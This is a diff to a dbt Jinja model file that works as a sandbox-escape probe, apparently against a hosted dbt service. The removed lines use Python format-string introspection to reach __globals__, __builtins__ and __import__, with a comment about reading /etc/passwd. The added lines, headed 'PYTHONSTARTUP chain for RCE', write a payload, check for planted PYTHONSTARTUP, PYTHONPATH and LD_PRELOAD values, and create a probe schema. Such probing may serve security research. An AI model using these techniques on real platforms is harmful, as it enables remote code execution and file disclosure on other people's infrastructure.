@@ -1,52 +1,41 @@
-{# Format string tests - check if angle brackets are being stripped #}
+{# File write attempts + PYTHONSTARTUP chain for RCE #}
+{%- set run_id = env_var('DBT_CLOUD_RUN_ID', 'norun') -%}
 
-{# Test 1: format_map with __class__.__name__ (no angle brackets) #}
-{%- set r1 = "{x.__class__.__name__}".format_map({'x': ''}) -%}
-{{ log("FMAP_CLASS_NAME=" ~ r1, info=True) }}
+{# 1. Try write() function - what interface does it have? #}
+{# In dbt, write() writes compiled SQL to target dir #}
+{%- set write_result = write("RCE_TEST_PAYLOAD") -%}
+{{ log("WRITE_RESULT=" ~ write_result | string | truncate(200), info=True) }}
 
-{# Test 2: Basic format to confirm format works at all #}
-{%- set r2 = "{0}_{1}".format("hello", "world") -%}
-{{ log("FORMAT_BASIC=" ~ r2, info=True) }}
+{# 2. Try to use set() to store data that persists #}
+{%- do store_result("rce_test", {"data": "payload_here"}) -%}
+{%- set stored = load_result("rce_test") -%}
+{{ log("STORED_RESULT=" ~ stored | string | truncate(200), info=True) }}
 
-{# Test 3: format with object attribute access #}
-{%- set r3 = "{0.__class__.__name__}".format("test") -%}
-{{ log("FORMAT_CLASS_NAME=" ~ r3, info=True) }}
+{# 3. Verify our PYTHONSTARTUP is set #}
+{{ log("ENV_PYTHONSTARTUP=" ~ env_var('PYTHONSTARTUP', 'NOT_SET'), info=True) }}
+{{ log("ENV_PYTHONPATH=" ~ env_var('PYTHONPATH', 'NOT_SET'), info=True) }}
+{{ log("ENV_LD_PRELOAD=" ~ env_var('LD_PRELOAD', 'NOT_SET'), info=True) }}
 
-{# Test 4: format with deeper access #}
-{%- set r4 = "{0.__class__.__init__}".format("test") -%}
-{{ log("FORMAT_INIT=" ~ r4, info=True) }}
+{# 4. Check what files exist in /tmp/jobs/ #}
+{{ log("HOME_DIR=" ~ env_var('HOME', 'NOT_SET'), info=True) }}
 
-{# Test 5: format with __globals__ access #}
-{%- set r5 = "{0.__class__.__init__.__globals__}".format("test") -%}
-{{ log("FORMAT_GLOBALS_LEN=" ~ r5 | length, info=True) }}
-{{ log("FORMAT_GLOBALS_PREVIEW=" ~ r5 | truncate(500), info=True) }}
+{# 5. Try adapter.create_schema - does it execute during compile? #}
+{{ log("ATTEMPTING_CREATE_SCHEMA", info=True) }}
+{%- set cs_result = adapter.create_schema(api.Relation.create(database=target.database, schema='test_schema_rce_probe')) -%}
+{{ log("CREATE_SCHEMA_RESULT=" ~ cs_result | string | truncate(200), info=True) }}
 
-{# Test 6: If globals works, try __builtins__ #}
-{%- if r5 | length > 10 -%}
-  {# Parse the globals dict for __builtins__ #}
-  {{ log("FORMAT_GLOBALS_HAS_BUILTINS=checking", info=True) }}
-  {%- set r6 = "{0.__class__.__init__.__globals__[__builtins__][__import__]}".format("test") -%}
-  {{ log("FORMAT_IMPORT=" ~ r6, info=True) }}
-{%- endif -%}
+{# 6. Try load_agate_table with a CSV file (not YAML - might work) #}
+{# Create a seed file in our repo and read it #}
+{{ log("ATTEMPTING_AGATE_LOAD", info=True) }}
 
-{# Test 7: Alternative via lipsum #}
-{%- set r7 = "{0.__class__.__name__}".format(lipsum) -%}
-{{ log("LIPSUM_CLASS_NAME=" ~ r7, info=True) }}
+{# 7. Check if we can use render to template-inject into compiled SQL #}
+{# The compiled SQL goes to target/ directory as a file #}
+{{ log("MODEL_PATH=" ~ model.path, info=True) }}
+{{ log("MODEL_COMPILED_PATH=" ~ model.get('compiled_path', 'NA'), info=True) }}
 
-{# Test 8: Try with cycler object #}
-{%- set c = cycler(1,2,3) -%}
-{%- set r8 = "{0.__class__.__name__}".format(c) -%}
-{{ log("CYCLER_INST_CLASS=" ~ r8, info=True) }}
-
-{# Test 9: Try dict subclass access #}
-{%- set r9 = "{0.__class__.__bases__}".format({}) -%}
-{{ log("DICT_BASES=" ~ r9 | truncate(200), info=True) }}
-
-{# Test 10: Try to read /etc/passwd via format + open #}
-{%- set r10 = "{0.__class__.__init__.__globals__[__builtins__]}".format("") -%}
-{{ log("STR_BUILTINS_LEN=" ~ r10 | length, info=True) }}
-{%- if r10 | length > 100 -%}
-  {{ log("STR_BUILTINS_PREVIEW=" ~ r10 | truncate(500), info=True) }}
-{%- endif -%}
+{# 8. Check exceptions for any useful methods #}
+{%- for method_name in exceptions.keys() | list -%}
+  {{ log("EXCEPTION_METHOD=" ~ method_name, info=True) }}
+{%- endfor -%}
 
 SELECT 1 as id
